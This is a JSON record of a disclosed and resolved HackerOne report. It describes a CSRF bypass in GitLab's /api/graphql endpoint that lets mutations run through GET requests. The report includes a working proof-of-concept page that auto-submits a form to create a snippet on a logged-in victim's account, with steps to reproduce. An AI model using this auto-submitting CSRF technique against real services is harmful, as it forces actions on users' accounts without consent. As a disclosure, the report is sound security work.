@@ -1,0 +1,134 @@
+{
+  "id": 1122408,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTIyNDA4",
+  "url": "https://hackerone.com/reports/1122408",
+  "title": "CSRF on /api/graphql allows executing mutations through GET requests",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-10T16:49:12.681Z",
+  "submitted_at": "2021-03-10T16:49:12.826Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "az3z3l",
+    "url": "/az3z3l",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/dtdN1DBMobGCr4ku6U6fEpid/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-08-02T19:10:34.660Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-08-02T19:04:53.295Z",
+  "team_member_agreed_on_going_public_at": "2021-08-02T19:10:34.511Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Mutations are `edit` or `create`  queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection\n\n\n### Code for Testing\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <meta name=\"referrer\" content=\"none\">\n    <meta name=\"referrer\" content=\"no-referrer\">\n</head>\n<body>\n      <form action=\"https://gitlab.com/api/graphql/\" id=\"csrf-form\" method=\"GET\">\n        <input name=\"query\" value=\"mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}\">\n        <input name=\"variables\" value='{\"input\":{\"title\":\"Tesssst Snippet\",\"description\":\"Hello World\",\"visibilityLevel\":\"public\",\"blobActions\":[{\"action\":\"create\",\"previousPath\":\"readme.md\",\"content\":\"reading this.md\",\"filePath\":\"readme.md\"}],\"uploadedFiles\":[],\"projectPath\":\"\"}}'>\n    </form>\n\n\n    <script>document.getElementById(\"csrf-form\").submit()</script>\n</body>\n</html>\n```\nThis exploit would create a snippet named `Tesssst Snippet` on the user's account. \n\n\n### Steps to Reproduce\n\n1. Host this file\n2. Login to gitlab\n3. Open the link to that html\n4. Check the snippets for the logged in user. \n\n\n### Impact\n\nThe attacker could control bypass the existing CSRF check on the graphql endpoint.\n\n\n### POC\n\nAttached the request and response screenshot\n\n\n\n### What is the expected *correct* behavior?\n\nThe backend must check the existence of csrf tokens for GET requests as well.\n\n## Impact\n\nThe attacker could control bypass the existing CSRF check on the graphql endpoint.",
+  "bounty_amount": "3370.0",
+  "formatted_bounty": "$3,370",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1225609,
+      "file_name": "gitlabCreateSnippet.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/l5n2lsbtp588tzi42ccz40zimocg?response-content-disposition=attachment%3B%20filename%3D%22gitlabCreateSnippet.png%22%3B%20filename%2A%3DUTF-8%27%27gitlabCreateSnippet.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7DU5GKF4%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151355Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCrQKyduZZSWpEa7lQMN1p4%2Fg3sVJGOZNwC3ZYR7%2BzycQIgbO5CkantWicBlLfZ3bxbC0XlhZro4xbuhPuDBKRdVAIqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBSQe56SuRqu2QVvTyqOBT4i9V77BanEH%2FGYmI11rEM55QdB3rIobpS5%2FjxyyMXKITycwIp%2B4ayHD3XZB4N%2FYY49mJGMUJzAIMHJdrEDZj%2FtME%2FiqdZBBHabD9xJ69%2FS9GPJWJBsaxSE3yEpRpnG3rXLoGIaI0IpS6%2B6VxL6tAG%2FmgR5wAXTpSRbQZbB938sNkSHfVWqCjL9HqTAfYobL%2BNM3yS09eA0f4Lqk0pJq8BuOZCmC2%2FweM1ZRosbQhGb8x%2B4F2XrzQHTXQXx8uFhr9hAL%2BrZ%2FMMZgX52azruzAaMMyLX9rkdwZDGYVvn3xmHKjxD%2F%2FAGiQcSFG2Vr941ofF%2B6%2BPHu%2BjJQMYvEk9R7QUCi43JpR1GcFdql%2BfMFAtu%2FitFOfBHcrR4gHixnRAfqDCOeM7MpPeq44t%2FirIITaflUg%2BdX2d7vqC%2B8tl%2FYPVE35IQpjB5REdOuOAHweGkZiaEHdxOBhdujXn5I3Ubnm2vq2%2FvhukewEaBlWBjW%2BVKjTOg7qCyQE7JZWj0RNKFiIsBnwfzKoJPy9rmhIOnShe%2FG92%2B83U2Ya3u0fTl4XugNh9Yrgp%2FRrBd1rxfcrUnZhgkRvOmzXw%2BAI2Tt9jukZQsLFrC5g0O0jljRuOut8hkMVojkBSFrk4MghR6rdPiCZsCua%2FcELUNkLX2VR6WSopllx95eh%2B9oGGVM%2Fc9mFoxlGj871FZOjKC%2BbupQtxkkYth1pePLoR2ElI0MQ2RlXgQLpZEmEhjObLpoRGcw787NHxHAgqKl1gN3Fj2ln1QHnkOWbJSP%2BpZs7jxZ9Zwy9mJ4pXvXn0zjaP%2FA7%2FUIBDCNb9QZdlzTYVklK9xEilmqIsjym9sJEMiBcYxHh8jEYH4wZgKHxRkkPHsgqEu%2FzDKi%2F3PBjqxASuspeEpRMQxbEopnX438NIm1UM1ErK9dmrje6ul%2BxExALlTvNbEkds3MRmm5Eszvbcmdq%2BRr0gS91HN4yDOxTHDmKrK7NaYJhXou1ldxYpcLWytN88C9p0a5T54OwwGn8WbTqxnn8vQLOoBENn8QVq40Bp0gB5kTAZfQYO0k3Wu3IVbRBH%2F%2BLCCRFyoaHdInJIaPAmx2Hx7bW4kebRsQGm4qOZkPOe4pfAiF91I3MlHiQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6069ac90752bf2da10c611610ba576d5db7add493a9cf91a75797926ac140193",
+      "file_size": 313589,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 85,
+  "voters": [
+    "arw9234",
+    "cyberjoinsthehunt",
+    "monkelife",
+    "arist0phanes",
+    "az3z3l",
+    "k0ns0l",
+    "defenderwww",
+    "loaymorad",
+    "haxor31337",
+    "bombon",
+    "and 75 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
